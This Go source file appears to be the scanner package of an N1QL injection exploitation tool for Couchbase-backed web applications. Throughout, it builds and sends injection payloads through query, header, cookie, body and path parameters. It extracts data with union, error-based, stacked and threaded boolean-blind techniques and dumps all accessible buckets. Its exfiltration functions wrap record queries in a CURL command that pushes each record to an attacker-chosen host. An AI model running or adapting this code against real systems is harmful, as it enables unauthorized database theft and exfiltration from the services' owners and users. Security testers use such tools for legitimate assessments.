package scanner

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"sync"

	"github.com/felsec/n1qlscan/internal/payloads"
	"github.com/felsec/n1qlscan/internal/target"
	"github.com/felsec/n1qlscan/internal/util"
)

var Threads int

func RawAttack(target target.Target) {
	client := CreateClient()
	resp, err := DoRequest(target, client)
	if err != nil {
		util.LogErr(err.Error())
		return
	}

	respDump, err := httputil.DumpResponse(resp, true)
	if err != nil {
		util.LogErr(err.Error())
		return
	}

	util.LogInfo(fmt.Sprintf("Response:\n%s", respDump))
}

func PrepareTarget(targetVictim target.Target, payload string, vulnEndpoint target.Vulnerable) target.Target {
	location := LocateParameter(targetVictim, vulnEndpoint.Parameter)
	victim := targetVictim.Copy()
	if len(location) <= 0 {
		util.LogErr("Target parameter not found!")
		return victim
	}

	switch location[0] {
	case Query:
		victim.Params[vulnEndpoint.Parameter] = url.QueryEscape(payload)
	case Header:
		victim.Headers[vulnEndpoint.Parameter] = payload
	case Cookie:
		victim.Cookies[vulnEndpoint.Parameter] = payload
	case Body:
		switch victim.BodyType {
		case target.FORM:
			victim.Body[vulnEndpoint.Parameter] = fmt.Sprintf("%v%s", victim.Body[vulnEndpoint.Parameter], payload)
		case target.JSON:
			// Marshal the JSON into a string
			bJson, err := json.Marshal(victim.Body)
			if err != nil {
				util.LogErr("Unable to build JSON body")
				return victim
			}
			bodyString := string(bJson)
			// Find parameter "<param>":
			index := 0
			index += strings.Index(bodyString, vulnEndpoint.Parameter)
			index += len(vulnEndpoint.Parameter)
			index += strings.Index(bodyString[index:], ":")
			index += strings.Index(bodyString[index:], "\"")
			index += 1 // skip past index of "
			index += strings.Index(bodyString[index:], "\"")
			newBodyString := bodyString[:index] + payload + bodyString[index:]
			// Unmarshal string back into map and assign to victim
			var result map[string]any
			json.Unmarshal([]byte(newBodyString), &result)
			victim.Body = result
		}
	case Path:
		idx := slices.Index(victim.Path, vulnEndpoint.Parameter)
		if strings.HasPrefix(payload, vulnEndpoint.Parameter) {
			if strings.Contains(payload, "/") {
				payload = strings.ReplaceAll(payload, "/", "%2f")
			}
			victim.Path[idx] = url.PathEscape(payload)
		} else {

			victim.Path[idx] = vulnEndpoint.Parameter + url.PathEscape(payload)
		}
	default:
		util.LogErr("Supplied parameter not found!")
	}

	return victim
}

func ExtractData(victim target.Target, vulnEndpoint target.Vulnerable, query string) string {
	var output = ""
	switch vulnEndpoint.ExploitType {
	case target.UNION:
		payload := fmt.Sprintf("SELECT %s as N1QLSCAN", query)
		unionPayload := strings.ReplaceAll(vulnEndpoint.PayloadTemplate, "<payload>", payload)
		switch vulnEndpoint.Detection {
		case 0, 2, 4:
			unionPayload += ",'a"
		case 1, 3, 5:
			unionPayload += `,"a`
		case 6, 7:
			unionPayload += "--"
		case 8, 9:
			unionPayload += ")--"
		case 10, 11:
			unionPayload += "))--"
		}
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", unionPayload))
		}
		resp := GetResponse(victim, vulnEndpoint, unionPayload)
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		decodedBody := html.UnescapeString(string(bodyBytes))
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Response body:\n%s", decodedBody))
		}
		if strings.Contains(decodedBody, "N1QLSCAN") {
			r := regexp.MustCompile(`"N1QLSCAN"[ ]{0,}:[ ]{0,}"(.+?)"`)
			match := r.FindStringSubmatch(decodedBody)
			if strings.Contains(strings.ToLower(query), "base64") {
				bdata, _ := base64.StdEncoding.DecodeString(match[1])
				output = string(bdata)
			} else {
				output = match[1]
			}
		} else {
			util.LogErr(fmt.Sprintf("SOMETHING WENT WRONG - PAYLOAD: %s", unionPayload))
		}
	case target.STACK:
		payload := fmt.Sprintf("SELECT %s as N1QLSCAN", query)
		switch vulnEndpoint.Detection {
		case 0, 2, 4, 6, 8, 10:
			payload += ",'a"
		case 1, 3, 5, 7, 9, 11:
			payload += `,"a`
		}
		stackPayload := strings.ReplaceAll(vulnEndpoint.PayloadTemplate, "<payload>", payload)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", stackPayload))
		}
		resp := GetResponse(victim, vulnEndpoint, stackPayload)
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		decodedBody := html.UnescapeString(string(bodyBytes))
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Response body:\n%s", decodedBody))
		}
		if strings.Contains(decodedBody, "N1QLSCAN") {
			r := regexp.MustCompile(`"N1QLSCAN"[ ]{0,}:[ ]{0,}"(.+?)"`)
			match := r.FindStringSubmatch(decodedBody)
			if strings.Contains(strings.ToLower(query), "base64") {
				bdata, _ := base64.StdEncoding.DecodeString(match[1])
				output = string(bdata)
			} else {
				output = match[1]
			}
		} else {
			util.LogErr(fmt.Sprintf("SOMETHING WENT WRONG - PAYLOAD: %s", stackPayload))
		}
	case target.ERROR:
		errorPayload := strings.ReplaceAll(vulnEndpoint.PayloadTemplate, "<payload>", query)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", errorPayload))
		}
		switch vulnEndpoint.Detection {
		case 0, 2, 4:
			errorPayload += " AND NOT '"
		case 1, 3, 5:
			errorPayload += ` AND NOT "`
		}
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", errorPayload))
		}
		resp := GetResponse(victim, vulnEndpoint, errorPayload)
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		decodedBody := html.UnescapeString(string(bodyBytes))
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Response body:\n%s", decodedBody))
		}
		if strings.Contains(decodedBody, "Abort") {
			r := regexp.MustCompile(`cause:[ ]{1,}(.+?)"`)
			match := r.FindStringSubmatch(decodedBody)
			if strings.Contains(strings.ToLower(query), "base64") {
				bdata, _ := base64.StdEncoding.DecodeString(match[1])
				output = string(bdata)
			} else {
				output = match[1]
			}
		} else {
			util.LogErr(fmt.Sprintf("SOMETHING WENT WRONG - PAYLOAD: %s", errorPayload))
		}
	case target.BOOLBLIND:
		baseResp := GetBaseResponse(victim, vulnEndpoint)
		defer baseResp.Body.Close()
		baseBodyBytes, _ := io.ReadAll(baseResp.Body)
		baseBody := string(baseBodyBytes)
		baseStatus := baseResp.StatusCode
		payload := fmt.Sprintf(" REGEX_LIKE(%s,%s)", query, payloads.BoolStep)
		basePayload := strings.Replace(vulnEndpoint.PayloadTemplate, "<payload>", payload, -1)
		basePayload = strings.Replace(basePayload, "<check>", "true", -1)
		switch vulnEndpoint.Detection {
		case 0, 2, 4:
			basePayload += " AND NOT '"
		case 1, 3, 5:
			basePayload += ` AND NOT "`
		}
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Data length payload: %s", basePayload))
		}
		length, _ := GetLength(victim, basePayload, vulnEndpoint, baseStatus, baseBody)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Data length: %d", length))
		}
		jobs := make(chan BinTask, length)
		results := make(chan BinResult, length)
		data := make([]string, length)
		var wg sync.WaitGroup

		for w := 1; w <= Threads; w++ {
			wg.Add(1)
			go BinaryWorker(jobs, results, &wg)
		}
		for i := range length {
			payload := fmt.Sprintf(" REGEX_LIKE(%s,%s%d%s)", query, payloads.BoolCharPre, i, payloads.BoolCharSuf)
			testPayload := strings.Replace(vulnEndpoint.PayloadTemplate, "<payload>", payload, -1)
			testPayload = strings.Replace(testPayload, "<check>", "true", -1)
			switch vulnEndpoint.Detection {
			case 0, 2, 4:
				testPayload += " AND NOT '"
			case 1, 3, 5:
				testPayload += ` AND NOT "`
			}
			if Verbose {
				util.LogVerbose(fmt.Sprintf("Exploit payload (position %d): %s", (i + 1), testPayload))
			}
			task := BinTask{
				position:     i,
				charset:      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.+/=-",
				basePayload:  testPayload,
				victim:       victim,
				vulnEndpoint: vulnEndpoint,
				baseStatus:   baseStatus,
				baseBody:     baseBody,
			}
			jobs <- task
		}
		close(jobs)

		go func() {
			wg.Wait()
			close(results)
		}()

		for res := range results {
			data[res.position] = res.result
		}
		if strings.Contains(strings.ToLower(query), "base64") {
			bdata, _ := base64.StdEncoding.DecodeString(strings.Join(data, ""))
			output = string(bdata)
		} else {
			output = strings.Join(data, "")
		}
	case target.STRCONCAT:
		base := GetBaseResponse(victim, vulnEndpoint)
		defer base.Body.Close()
		baseBodyBytes, _ := io.ReadAll(base.Body)
		baseBody := string(baseBodyBytes)
		baseStatus := base.StatusCode
		payload := fmt.Sprintf("CASE WHEN REGEX_LIKE(%s,%s) THEN '' ELSE 'FAIL' END", query, payloads.BoolStep)
		basePayload := strings.Replace(vulnEndpoint.PayloadTemplate, "<payload>", payload, -1)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Data length payload: %s", basePayload))
		}
		length, _ := GetLength(victim, basePayload, vulnEndpoint, baseStatus, baseBody)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Data length: %d", length))
		}
		jobs := make(chan BinTask, length)
		results := make(chan BinResult, length)
		data := make([]string, length)
		var wg sync.WaitGroup

		for w := 1; w <= Threads; w++ {
			wg.Add(1)
			go BinaryWorker(jobs, results, &wg)
		}
		for i := range length {
			payload := fmt.Sprintf("CASE WHEN REGEX_LIKE(%s,%s%d%s) THEN '' ELSE 'FAIL' END", query, payloads.BoolCharPre, i, payloads.BoolCharSuf)
			testPayload := strings.Replace(vulnEndpoint.PayloadTemplate, "<payload>", payload, -1)
			if Verbose {
				util.LogVerbose(fmt.Sprintf("Exploit payload (position %d): %s", (i + 1), testPayload))
			}
			task := BinTask{
				position:     i,
				charset:      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.+/=-",
				basePayload:  testPayload,
				victim:       victim,
				vulnEndpoint: vulnEndpoint,
				baseStatus:   baseStatus,
				baseBody:     baseBody,
			}
			jobs <- task
		}
		close(jobs)

		go func() {
			wg.Wait()
			close(results)
		}()

		for res := range results {
			data[res.position] = res.result
		}
		if strings.Contains(strings.ToLower(query), "base64") {
			bdata, _ := base64.StdEncoding.DecodeString(strings.Join(data, ""))
			output = string(bdata)
		} else {
			output = strings.Join(data, "")
		}
	}
	return output
}

func CheckBucketExists(victim target.Target, vulnEndpoint target.Vulnerable, query string) bool {
	switch vulnEndpoint.ExploitType {
	case target.UNION:
		payload := fmt.Sprintf("SELECT %s as N1QLSCAN", query)
		unionPayload := strings.ReplaceAll(vulnEndpoint.PayloadTemplate, "<payload>", payload)
		switch vulnEndpoint.Detection {
		case 0, 2, 4:
			unionPayload += ",'a"
		case 1, 3, 5:
			unionPayload += `,"a`
		case 6, 7:
			unionPayload += "--"
		case 8, 9:
			unionPayload += ")--"
		case 10, 11:
			unionPayload += "))--"
		}
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", unionPayload))
		}
		resp := GetResponse(victim, vulnEndpoint, unionPayload)
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		decodedBody := html.UnescapeString(string(bodyBytes))
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Response body:\n%s", decodedBody))
		}
		if strings.Contains(decodedBody, "N1QLSCAN") {
			r := regexp.MustCompile(`"N1QLSCAN"[ ]{0,}:[ ]{0,}"(.+?)"`)
			return r.MatchString(decodedBody)
		} else {
			util.LogErr("Target bucket not found. Please check the name of the bucket.")
			return false
		}
	case target.STACK:
		payload := fmt.Sprintf("SELECT %s as N1QLSCAN", query)
		switch vulnEndpoint.Detection {
		case 0, 2, 4, 6, 8, 10:
			payload += ",'a"
		case 1, 3, 5, 7, 9, 11:
			payload += `,"a`
		}
		stackPayload := strings.ReplaceAll(vulnEndpoint.PayloadTemplate, "<payload>", payload)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", stackPayload))
		}
		resp := GetResponse(victim, vulnEndpoint, stackPayload)
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		decodedBody := html.UnescapeString(string(bodyBytes))
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Response body:\n%s", decodedBody))
		}
		if strings.Contains(decodedBody, "N1QLSCAN") {
			r := regexp.MustCompile(`"N1QLSCAN"[ ]{0,}:[ ]{0,}"(.+?)"`)
			return r.MatchString(decodedBody)
		} else {
			util.LogErr("Target bucket not found. Please check the name of the bucket.")
			return false
		}
	case target.ERROR:
		errorPayload := strings.ReplaceAll(vulnEndpoint.PayloadTemplate, "<payload>", query)
		switch vulnEndpoint.Detection {
		case 0, 2, 4:
			errorPayload += " AND NOT '"
		case 1, 3, 5:
			errorPayload += ` AND NOT "`
		}
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", errorPayload))
		}
		resp := GetResponse(victim, vulnEndpoint, errorPayload)
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		decodedBody := html.UnescapeString(string(bodyBytes))
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Response body:\n%s", decodedBody))
		}
		if strings.Contains(decodedBody, "Abort") {
			r := regexp.MustCompile(`"cause:[ ]{1,}"(.+?)"`)
			return r.MatchString(decodedBody)
		} else {
			util.LogErr("Target bucket not found. Please check the name of the bucket.")
			return false
		}
	case target.BOOLBLIND:
		baseResp := GetBaseResponse(victim, vulnEndpoint)
		defer baseResp.Body.Close()
		baseBodyBytes, _ := io.ReadAll(baseResp.Body)
		baseBody := string(baseBodyBytes)
		baseStatus := baseResp.StatusCode
		payload := fmt.Sprintf(" REGEX_LIKE(%s,%s)", query, payloads.BoolStep)
		basePayload := strings.Replace(vulnEndpoint.PayloadTemplate, "<payload>", payload, -1)
		basePayload = strings.Replace(basePayload, "<check>", "true", -1)
		switch vulnEndpoint.Detection {
		case 0, 2, 4:
			basePayload += " AND NOT '"
		case 1, 3, 5:
			basePayload += ` AND NOT "`
		}
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Data length payload: %s", basePayload))
		}
		length, _ := GetLength(victim, basePayload, vulnEndpoint, baseStatus, baseBody)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Data length returned: %d", length))
		}
		if 5 > length {
			util.LogErr("Target bucket not found. Please check the name of the bucket.")
			return false
		}
		return true
	case target.STRCONCAT:
		base := GetBaseResponse(victim, vulnEndpoint)
		defer base.Body.Close()
		baseBodyBytes, _ := io.ReadAll(base.Body)
		baseBody := string(baseBodyBytes)
		baseStatus := base.StatusCode
		payload := fmt.Sprintf("CASE WHEN REGEX_LIKE(%s,%s) THEN '' ELSE 'FAIL' END", query, payloads.BoolStep)
		basePayload := strings.Replace(vulnEndpoint.PayloadTemplate, "<payload>", payload, -1)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Data length payload: %s", basePayload))
		}
		length, _ := GetLength(victim, basePayload, vulnEndpoint, baseStatus, baseBody)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Data length returned: %d", length))
		}
		if 5 > length {
			util.LogErr("Target bucket not found. Please check the name of the bucket.")
			return false
		}
		return true
	}
	return false
}

func RunCurlCommand(victim target.Target, vulnEndpoint target.Vulnerable, query string) {
	switch vulnEndpoint.ExploitType {
	case target.UNION:
		payload := fmt.Sprintf("SELECT %s as N1QLSCAN", query)
		unionPayload := strings.ReplaceAll(vulnEndpoint.PayloadTemplate, "<payload>", payload)
		switch vulnEndpoint.Detection {
		case 0, 2, 4:
			unionPayload += ",'a"
		case 1, 3, 5:
			unionPayload += `,"a`
		case 6, 7:
			unionPayload += "--"
		case 8, 9:
			unionPayload += ")--"
		case 10, 11:
			unionPayload += "))--"
		}
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", unionPayload))
		}
		GetResponse(victim, vulnEndpoint, unionPayload)
	case target.STACK:
		payload := fmt.Sprintf("SELECT %s as N1QLSCAN", query)
		switch vulnEndpoint.Detection {
		case 0, 2, 4, 6, 8, 10:
			payload += ",'a"
		case 1, 3, 5, 7, 9, 11:
			payload += `,"a`
		}
		stackPayload := strings.ReplaceAll(vulnEndpoint.PayloadTemplate, "<payload>", payload)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", stackPayload))
		}
		GetResponse(victim, vulnEndpoint, stackPayload)
	case target.ERROR:
		errorPayload := strings.ReplaceAll(vulnEndpoint.PayloadTemplate, "<payload>", query)
		switch vulnEndpoint.Detection {
		case 0, 2, 4:
			errorPayload += " AND NOT '"
		case 1, 3, 5:
			errorPayload += ` AND NOT "`
		}
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", errorPayload))
		}
		GetResponse(victim, vulnEndpoint, errorPayload)
	case target.BOOLBLIND:
		basePayload := strings.Replace(vulnEndpoint.PayloadTemplate, "<payload>", fmt.Sprintf(" %s", query), -1)
		basePayload = strings.Replace(basePayload, "<check>", "true", -1)
		switch vulnEndpoint.Detection {
		case 0, 2, 4:
			basePayload += " AND NOT '"
		case 1, 3, 5:
			basePayload += ` AND NOT "`
		}
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", basePayload))
		}
		GetResponse(victim, vulnEndpoint, basePayload)
	case target.STRCONCAT:
		payload := fmt.Sprintf("CASE WHEN %s THEN '' ELSE 'FAIL' END", query)
		basePayload := strings.Replace(vulnEndpoint.PayloadTemplate, "<payload>", payload, -1)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Exploit payload: %s", basePayload))
		}
		GetResponse(victim, vulnEndpoint, basePayload)
	}
}

func ExtractBucketData(victim target.Target, vulnEndpoint target.Vulnerable, targetBucket string) string {
	recordCountQuery := strings.ReplaceAll(payloads.RecordCount, "<bucket>", targetBucket)
	if Verbose {
		util.LogVerbose(fmt.Sprintf("Record count payload: %s", recordCountQuery))
	}
	output := ExtractData(victim, vulnEndpoint, recordCountQuery)
	if output == "" {
		util.LogErr("Unable to get the record count for the bucket.")
	}
	recordCount, _ := strconv.ParseInt(output[1:(len(output)-1)], 10, 0)
	util.LogInfo(fmt.Sprintf("Bucket Record Count: %d", recordCount))
	var bucketData = make([]string, recordCount)
	for record := range recordCount {
		recordQuery := strings.ReplaceAll(payloads.SingleRecord, "<bucket>", targetBucket)
		recordQuery = strings.ReplaceAll(recordQuery, "<record>", fmt.Sprintf("%d", record))
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Record %d base payload: %s", record, recordQuery))
		}
		output := ExtractData(victim, vulnEndpoint, recordQuery)
		bucketData[record] = output
	}
	return strings.Join(bucketData, "\n")
}

func ExfilBucketData(victim target.Target, vulnEndpoint target.Vulnerable, targetBucket string, targetHost string) {
	recordCountQuery := strings.ReplaceAll(payloads.RecordCount, "<bucket>", targetBucket)
	if Verbose {
		util.LogVerbose(fmt.Sprintf("Record count payload: %s", recordCountQuery))
	}
	output := ExtractData(victim, vulnEndpoint, recordCountQuery)
	if output == "" {
		util.LogErr("Unable to get the record count for the bucket.")
	}
	recordCount, _ := strconv.ParseInt(output[1:(len(output)-1)], 10, 0)
	util.LogInfo(fmt.Sprintf("Bucket Record Count: %d", recordCount))
	for record := range recordCount {
		recordQuery := strings.ReplaceAll(payloads.SingleRecord, "<bucket>", targetBucket)
		recordQuery = strings.ReplaceAll(recordQuery, "<record>", fmt.Sprintf("%d", record))
		exfilRecordQuery := strings.ReplaceAll(payloads.CurlCommand, "<ehost>", targetHost)
		exfilRecordQuery = strings.ReplaceAll(exfilRecordQuery, "<command>", recordQuery)
		if Verbose {
			util.LogVerbose(fmt.Sprintf("Record %d base payload: %s", record, exfilRecordQuery))
		}
		RunCurlCommand(victim, vulnEndpoint, exfilRecordQuery)
	}
}

func ExfilAllBuckets(victim target.Target, vulnEndpoint target.Vulnerable, targetHost string) {
	if Verbose {
		util.LogVerbose("Extracting all accessible buckets")
	}
	allBucketNames := ExtractData(victim, vulnEndpoint, payloads.AllBucketNames)
	var buckets []string
	_ = json.Unmarshal([]byte(allBucketNames), &buckets)
	if Verbose {
		util.LogVerbose(fmt.Sprintf("Accessible buckets:\n%s", strings.Join(buckets, "\n")))
	}
	util.LogInfo(fmt.Sprintf("Extracting the data from %d buckets", len(buckets)))
	for bucket := range buckets {
		util.LogInfo(fmt.Sprintf("Dumping bucket: %s", buckets[bucket]))
		ExfilBucketData(victim, vulnEndpoint, buckets[bucket], targetHost)
	}
}

func DumpAllBuckets(victim target.Target, vulnEndpoint target.Vulnerable) {
	if Verbose {
		util.LogVerbose("Extracting all accessible buckets")
	}
	allBucketNames := ExtractData(victim, vulnEndpoint, payloads.AllBucketNames)
	var buckets []string
	_ = json.Unmarshal([]byte(allBucketNames), &buckets)
	if Verbose {
		util.LogVerbose(fmt.Sprintf("Accessible buckets:\n%s", strings.Join(buckets, "\n")))
	}
	util.LogInfo(fmt.Sprintf("Extracting the data from %d buckets", len(buckets)))
	for bucket := range buckets {
		util.LogInfo(fmt.Sprintf("Dumping bucket: %s", buckets[bucket]))
		output := ExtractBucketData(victim, vulnEndpoint, buckets[bucket])
		util.LogInfo(fmt.Sprintf("Bucket: %s\nData:\n%s", buckets[bucket], output))
	}
}

type BinTask struct {
	position     int
	charset      string
	basePayload  string
	victim       target.Target
	vulnEndpoint target.Vulnerable
	baseStatus   int
	baseBody     string
}

type BinResult struct {
	position int
	result   string
}

func BinaryWorker(jobs <-chan BinTask, results chan<- BinResult, wg *sync.WaitGroup) {
	defer wg.Done()
	for j := range jobs {
		output := BinResult{
			position: j.position,
			result:   BinarySearch(j.charset, j.victim, j.basePayload, j.vulnEndpoint, j.baseStatus, j.baseBody),
		}
		if Verbose {
			util.LogVerbose(
				fmt.Sprintf(
					"Position %d: %s",
					output.position+1,
					output.result))
		}
		results <- output
	}
}

func BinarySearch(baseChars string, victim target.Target, basePayload string, vulnEndpoint target.Vulnerable, baseStatus int, baseBody string) string {
	c := CreateClient()
	payload := strings.Replace(basePayload, "<chars>", baseChars, -1)
	t := PrepareTarget(victim, payload, vulnEndpoint)
	resp, _ := DoRequest(t, c)
	if CompareResponses(baseStatus, baseBody, resp, payload) {
		prevChars := baseChars
		for {
			part1 := prevChars[0 : len(prevChars)/2]
			charPayload := strings.Replace(basePayload, "<chars>", part1, -1)
			t := PrepareTarget(victim, charPayload, vulnEndpoint)
			resp, _ := DoRequest(t, c)
			if CompareResponses(baseStatus, baseBody, resp, charPayload) {
				if len(part1) == 1 {
					return part1
				}
				prevChars = part1
			} else {
				part2 := prevChars[len(prevChars)/2:]
				if len(part2) == 1 {
					return part2
				}
				prevChars = part2
			}
		}
	}
	return ""
}

func GetBaseResponse(victim target.Target, vulnEndpoint target.Vulnerable) *http.Response {
	c := CreateClient()
	t := PrepareTarget(victim, vulnEndpoint.ExamplePayload, vulnEndpoint)
	resp, _ := DoRequest(t, c)
	return resp
}

func GetResponse(victim target.Target, vulnEndpoint target.Vulnerable, payload string) *http.Response {
	c := CreateClient()
	t := PrepareTarget(victim, payload, vulnEndpoint)
	resp, _ := DoRequest(t, c)
	return resp
}

func GetLength(target target.Target, basePayload string, vulnEndpoint target.Vulnerable, baseStatus int, baseBody string) (int, string) {
	c := CreateClient()
	lastTrue := 0
	lastFalse := -42
	step := 1
	stepGap := 8
	for stepGap >= 1 {
		currentPayload := strings.Replace(basePayload, "<step>", fmt.Sprint(step), -1)
		t := PrepareTarget(target, currentPayload, vulnEndpoint)
		resp, _ := DoRequest(t, c)
		if CompareResponses(baseStatus, baseBody, resp, currentPayload) {
			if lastFalse-step == 1 {
				return step, ""
			}
			lastTrue = step
		} else {
			if step == 1 {
				return step, "Unable to get the length of the output"
			} else {
				if step-lastTrue == 1 {
					return lastTrue, ""
				}
				lastFalse = step
				stepGap = stepGap / 2
			}
		}
		step = lastTrue + stepGap
	}

	return 0, ""
}
